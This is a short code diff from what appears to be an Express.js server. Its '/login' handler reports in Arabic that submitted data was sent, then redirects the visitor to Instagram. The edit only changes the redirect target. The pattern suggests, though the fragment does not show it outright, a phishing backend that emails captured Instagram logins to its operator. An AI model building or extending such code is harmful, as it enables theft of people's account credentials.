@@ -34,7 +34,7 @@ app.post('/login', (req, res) => {
       return res.send('حدث خطأ أثناء الإرسال.');
     }
     console.log('✅ تم إرسال البيانات:', info.response);
-    res.redirect('instagram://app');
+    res.redirect('/?redirect=instagram');
   });
 });
 
